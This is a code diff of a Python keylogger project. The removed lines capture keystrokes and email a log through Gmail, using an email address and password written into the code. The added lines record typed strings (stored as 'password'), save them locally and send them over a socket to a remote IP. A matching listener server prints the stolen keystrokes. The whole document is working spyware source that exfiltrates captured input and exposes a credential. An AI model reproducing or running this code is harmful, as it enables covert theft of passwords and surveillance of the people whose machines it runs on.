@@ -1,89 +1,71 @@
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
-import smtplib
-
-import socket
-import platform
-
-import win32clipboard
-
-from pynput.keyboard import Key, Listener
-
-import time
+import keyboard
 import os
+import socket
 
-import getpass
+# IP and port of the remote computer (the receiver)
+SERVER_IP = (
+    "192.168.1.100"  # Replace with the actual IP address of the receiving machine
+)
+SERVER_PORT = 12345  # Choose an open port for the connection
 
+# Set up a socket connection to send data to another computer
+client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client_socket.connect((SERVER_IP, SERVER_PORT))
 
-keys_information = "key_log.txt"
-system_information = "syseminfo.txt"
-clipboard_information = "clipboard.txt"
-audio_information = "audio.wav"
-screenshot_information = "screenshot.png"
+# Defining the text file name and path (Optional, you can save data locally as well)
+path = os.path.abspath("keysniffer_data.txt")
 
-keys_information_e = "e_key_log.txt"
-system_information_e = "e_systeminfo.txt"
-clipboard_information_e = "e_clipboard.txt"
+try:
+    while True:
+        with open(path, "a") as data_file:
+            # All key presses are recorded as a list into "events"
+            # and the record loop stops when the "enter" key is pressed
+            events = keyboard.record("enter")
+            password = list(keyboard.get_typed_strings(events))
 
-microphone_time = 10
-time_iteration = 15
-number_of_iterations_end = 3
+            # Write captured keystrokes to the local file
+            data_file.write("\n")  # New line before writing data
+            data_file.write(password[0])
 
-email_address = "7unkym0nk3y@gmail.com"  # Enter disposable email here
-password = "262dZwBcad&q@qJEaneX"  # Enter email password here
+            # Send the captured keystrokes to the remote computer via the socket
+            client_socket.sendall(
+                password[0].encode("utf-8")
+            )  # Send keystrokes as bytes
 
-username = getpass.getuser()
-
-toaddr = "7unkym0nk3y@gmail.com"  # Enter the email address you want to send your information to
-
-file_path = "C:\\Users\\Cyb3r_Tyr\\Documents\\GitHub\\Keysniffer\\Keysniffer"  # Enter the file path you want your files to be saved to
-extend = "\\"
-file_merge = file_path + extend
-
-
-# email controls
-def send_email(filename, attachment, toaddr):
-
-    fromaddr = email_address
-
-    msg = MIMEMultipart()
-
-    msg["From"] = fromaddr
-
-    msg["To"] = toaddr
-
-    msg["Subject"] = "Log File"
-
-    body = "Body_of_the_mail"
-
-    msg.attach(MIMEText(body, "plain"))
-
-    filename = filename
-    attachment = open(attachment, "rb")
-
-    p = MIMEBase("application", "octet-stream")
-
-    p.set_payload((attachment).read())
-
-    encoders.encode_base64(p)
-
-    p.add_header("Content-Disposition", "attachment; filename= %s" % filename)
-
-    msg.attach(p)
-
-    s = smtplib.SMTP("smtp.gmail.com", 587)
-
-    s.starttls()
-
-    s.login(fromaddr, password)
-
-    text = msg.as_string()
-
-    s.sendmail(fromaddr, toaddr, text)
-
-    s.quit()
+except KeyboardInterrupt:
+    print("Keylogger stopped.")
+finally:
+    client_socket.close()
 
 
-send_email(keys_information, file_path + extend + keys_information, toaddr)
+# server part
+import socket
+
+# IP and port to listen on (make sure to match the receiving machine's IP and port)
+HOST = "0.0.0.0"  # Listen on all available network interfaces
+PORT = 12345  # Use the same port number as the keylogger's server
+
+# Create a socket for receiving the data
+server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server_socket.bind((HOST, PORT))
+server_socket.listen(1)
+
+print(f"Listening for incoming connections on {HOST}:{PORT}...")
+
+# Accept incoming connection from the keylogger
+client_socket, client_address = server_socket.accept()
+print(f"Connection established with {client_address}")
+
+# Receive and print the keystrokes
+try:
+    while True:
+        data = client_socket.recv(1024)  # Receive up to 1024 bytes of data at a time
+        if not data:
+            break  # If no data is received, exit the loop
+        print(
+            f"Received keystroke: {data.decode('utf-8')}"
+        )  # Print the received keystroke
+finally:
+    print("Closing connection.")
+    client_socket.close()  # Close the connection when done
+    server_socket.close()  # Close the server socket
